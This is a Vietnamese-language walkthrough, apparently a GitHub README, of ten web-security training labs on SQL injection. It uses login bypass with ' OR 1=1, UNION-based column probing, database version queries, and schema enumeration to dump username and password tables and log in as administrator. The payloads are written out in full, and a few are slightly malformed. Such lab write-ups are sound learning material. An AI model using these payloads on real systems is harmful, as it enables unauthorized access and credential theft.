### 1.SQL injection vulnerability in WHERE clause allowing retrieval of hidden data

- Mô tả:

Khi người dùng chọn một danh mục, ứng dụng sẽ thực hiện một truy vấn SQL:

SELECT * FROM products WHERE category = 'Accessories' AND released = 1

Khi nhấp vào các nút, kết quả sẽ được lọc theo danh mục:

<img width="1882" height="589" alt="image" src="https://github.com/user-attachments/assets/8b1cd033-f310-47da-9d81-d0f922e1a683" />

- POC:

1. Mở trang lab trong trình duyệt: https://<lab-host>/filter?category=Gifts và bật Burp Proxy để bắt request.

2. Thao tác chọn danh mục “Gifts” trên giao diện để tạo request, hoặc mở URL gốc.

3. Trong Proxy → HTTP history, tìm request GET tới /filter với tham số category. Send to Repeater.

4. Trong Repeater, sửa tham số category thành payload nhằm phá vỡ chuỗi và thêm điều kiện luôn đúng

/filter?category=Accessories'OR 1=1-- - 

5. Send request trong Repeater và quan sát response trả về

<img width="1887" height="755" alt="image" src="https://github.com/user-attachments/assets/33d8e050-e165-4d80-aef1-e41e84dc81d7" />

### 2.SQL injection vulnerability allowing login bypass

- Mô tả:

Bài lab có lỗ hổng SQL injection trong chức năng đăng nhập. Để hoàn thành phải đăng nhập vào tài khoản administrator

- POC:

1. Mở trang login

2. Username, viết payload ' OR 1=1-- - sau administrator

<img width="926" height="382" alt="image" src="https://github.com/user-attachments/assets/ede1d34c-cdef-496a-830f-c9900d80d538" />

3. Password, nhập chuỗi bất kỳ .

4. Nhấn Login.

5. Quan sát kết quả

<img width="940" height="564" alt="image" src="https://github.com/user-attachments/assets/c8e1dd77-d988-4323-9123-796db233b7e2" />

### 3.SQL injection UNION attack, determining the number of columns returned by the query

- Mô tả: Xác định số cột được truy vấn trả về bằng cách dùng UNION trả về một hàng bổ sung chứa các giá trị null.

- POC:

Kiểm tra số cột: /filter?category=Lifestyle'union select null,null,null-- -

<img width="1821" height="806" alt="image" src="https://github.com/user-attachments/assets/210e0b5c-1312-4e1b-960e-0d148c4bf244" />

### 4.SQL injection UNION attack, finding a column containing text

- Mô tả: In ra 1 chuỗi ngẫu nhiên ở cột tương thích với dữ liệu chuỗi

- POC:
1. Kiểm tra số cột

/filter?category=Gifts'union select null,null,null-- -

<img width="1651" height="778" alt="image" src="https://github.com/user-attachments/assets/0cd2c23e-e6f4-4e08-be49-6eb735d5156b" />

2. Thay giá trị vào các cột

/filter?category=Gifts'union all select '1234','vNQIIQ','12'-- -

<img width="1646" height="708" alt="image" src="https://github.com/user-attachments/assets/3db12a63-4cf5-46ae-a794-707b4bf93366" />

### 5.SQL injection UNION attack, retrieving data from other tables
- Mô tả: Cơ sở dữ liệu chứa một bảng khác có tên là users, với các cột có tên là username và password. dùng UNION để lấy tất cả tên người dùng và mật khẩu, sau đó sử dụng thông tin đó để đăng nhập với tư cách là administrator.

- POC:
1. Kiểm tra số cột

/filter?category=Accessories'union select null,null-- -

<img width="1644" height="531" alt="image" src="https://github.com/user-attachments/assets/b0ee7a5a-96f9-4b46-b16b-7caefcbc5c2a" />

2. Liệt kê giá trị của 2 cột username và password

/filter?category=Accessories'union select username,password from users-- -

<img width="1445" height="431" alt="image" src="https://github.com/user-attachments/assets/c64c9a7f-1e86-4822-b114-bc2376f32c65" />

3. Đăng nhập vào tài khoản administrator

<img width="1168" height="545" alt="image" src="https://github.com/user-attachments/assets/f071af06-90b3-49aa-8906-ed8eedec8bec" />

### 6.SQL injection UNION attack, retrieving multiple values in a single column

- Mô tả:Cơ sở dữ liệu chứa một bảng khác có tên là users, với các cột có tên là usernamevà password. dùng UNION để lấy tất cả tên người dùng và mật khẩu, sau đó sử dụng thông tin đó để đăng nhập với tư cách là administrator. Truy xuất nhiều giá trị trong một cột.

- POC:

1. Kiểm tra số cột

/filter?category=Lifestyle'union select null,null -- - 

<img width="1667" height="594" alt="image" src="https://github.com/user-attachments/assets/ff429ca1-64f6-405f-85c3-337ef4f7737b" />

2. Liệt kê giá trị của 2 cột username và password vào cùng 1 cột

/filter?category=Lifestyle'union select null,username||password from users-- -

<img width="1557" height="611" alt="image" src="https://github.com/user-attachments/assets/3eb7e1e4-61fc-46db-a6fc-8712e08dabb7" />

3. Đăng nhập vào tài khoản administrator

<img width="1019" height="560" alt="image" src="https://github.com/user-attachments/assets/1cd8c1a9-ee76-4f6a-b20f-363eed5ae851" />

### 7.SQL injection attack, querying the database type and version on Oracle

- Mô tả:

Mục tiêu của bài lab: Hiển thị chuỗi phiên bản cơ sở dữ liệu (database version string). Trên Oracle, mọi SELECT phải chỉ rõ bảng FROM. Nếu UNION SELECT không truy vấn từ bảng nào, cần thêm FROM <table>, Oracle có bảng tích hợp tên dual để dùng trong trường hợp này.

- POC:

1. Kiểm tra số cột

/filter?category=Accessories' union all select NULL,NULL FROM dual-- -

<img width="1885" height="847" alt="image" src="https://github.com/user-attachments/assets/d2acda80-58e1-4291-8f7e-ee47f7767459" />

response không lỗi (2 cột NULL hợp lệ).

2. Lấy version trên Oracle: Oracle có view v$version chứa banner. Vì Oracle bắt buộc phải có FROM nên payload truyền vào sau Accessories:

/filter?category=Accessories'union all select 'aaa',banner FROM v$version-- -

(Giải thích: UNION ALL SELECT 'aaa', banner FROM v$version — cột đầu là một chuỗi tạm để phù hợp 2 cột, cột thứ hai lấy banner từ v$version.)

3. Send và quan sát response

<img width="1853" height="739" alt="image" src="https://github.com/user-attachments/assets/951ccedc-c428-4d59-9a8b-5a166410d269" />

### 8.SQL injection attack, querying the database type and version on MySQL and Microsoft

- Mô tả:

Yêu cầu cơ sở dữ liệu lấy chuỗi: '8.0.32-0ubuntu0.20.04.2'

- POC:

1. Kiểm tra số cột

/filter?category=Accessories'union all select NULL,NULL-- -

<img width="1668" height="615" alt="image" src="https://github.com/user-attachments/assets/a6964490-e037-4cfc-aa7f-391acdb7be38" />

response không lỗi (2 cột NULL hợp lệ).

2. Lấy version trên Microsoft

/filter?category=Accessories'union select 'aaa',@@version-- -

3. Send và quan sát response

<img width="1873" height="687" alt="image" src="https://github.com/user-attachments/assets/768731c5-2669-4f7b-b620-18ae0a48cda2" />

### 9.SQL injection attack, listing the database contents on non-Oracle databases

- Mô tả:

Ứng dụng có chức năng đăng nhập và cơ sở dữ liệu không phải của Oracle databases chứa một bảng lưu trữ tên người dùng và mật khẩu. Cần xác định tên của bảng này và các cột chứa trong bảng, sau đó truy xuất nội dung của bảng để lấy tên người dùng và mật khẩu của tất cả người dùng và đăng nhập với tư cách administrator.

- POC:

1. Kiểm tra số cột

/filter?category=Accessories'union all select null,null-- -

<img width="1600" height="481" alt="image" src="https://github.com/user-attachments/assets/4a5f6763-cf8f-4bf1-8b3c-50ddb2aa045a" />

response không lỗi (2 cột NULL hợp lệ).

2. Liệt kê tên bảng 

/filter?category=Accessories'union all select 'abc',table_name from information_schema.tables--

<img width="1169" height="853" alt="image" src="https://github.com/user-attachments/assets/e847237b-11c6-4f1b-aacb-9b61237b7b58" />

3. Liệt kê cột của bảng users_ibdtik

/filter?category=Accessories'union all select 'abc', column_name from information_schema.columns where table_name 'users ibdtik'--

<img width="1109" height="746" alt="image" src="https://github.com/user-attachments/assets/7f98ec77-8e9a-4b56-9b16-7f7b1d1b5284" />

4. Liệt kê giá trị của 2 cột username_yiszda và password_qrxtez

/filter?category='union all select username_yiszda, password_qrxtez from users_ibdtik--

<img width="1138" height="801" alt="image" src="https://github.com/user-attachments/assets/9ad8b17e-5a89-4902-bae3-73b9f55dc129" />

5. Đăng nhập vào tài khoản administrator

<img width="944" height="519" alt="image" src="https://github.com/user-attachments/assets/372eb8e1-af6e-4332-81c7-b705ebfd9d3b" />

### 10.SQL injection attack, listing the database contents on Oracle

- Mô tả:

Ứng dụng có chức năng đăng nhập và cơ sở dữ liệu trên Oracle chứa một bảng lưu trữ tên người dùng và mật khẩu. Cần xác định tên của bảng này và các cột chứa trong bảng, sau đó truy xuất nội dung của bảng để lấy tên người dùng và mật khẩu của tất cả người dùng và đăng nhập với tư cách administrator.

- POC:

1. Kiểm tra số cột

/filter?category=Accessories'union all select null,null from dual-- -

<img width="1694" height="658" alt="image" src="https://github.com/user-attachments/assets/c078548e-42e5-4b93-9d1a-a421212f3733" />

2. Liệt kê tên bảng

/filter?category=Accessories'union all select 'a',table_name from all_tables-- -

<img width="1391" height="368" alt="image" src="https://github.com/user-attachments/assets/e061caa6-1127-45eb-9c55-f2c861ebaf6a" />

3. Liệt kê cột của bảng USERS_HAXSQK

/filter?category=Accessories'union all select 'a',column_name from all_tab_columns where table_name=USERS_HAXSQK-- -

<img width="1418" height="599" alt="image" src="https://github.com/user-attachments/assets/73af8f4c-a777-469b-904c-2867fb88c00a" />

4. Liệt kê giá trị của 2 cột USERNAME_VAPQIJ và PASSWORD_ITOVBE

/filter?category=Accessories'union all select USERNAME_VAPQIJ,PASSWORD_ITOVBE from USERS_HAXSQK-- -

<img width="1416" height="647" alt="image" src="https://github.com/user-attachments/assets/53a50ba3-862b-462c-b4c3-d94a6626821d" />

5. Đăng nhập vào tài khoản administrator

<img width="981" height="417" alt="image" src="https://github.com/user-attachments/assets/31867ac1-a444-49ad-abd8-100fd739dec8" />
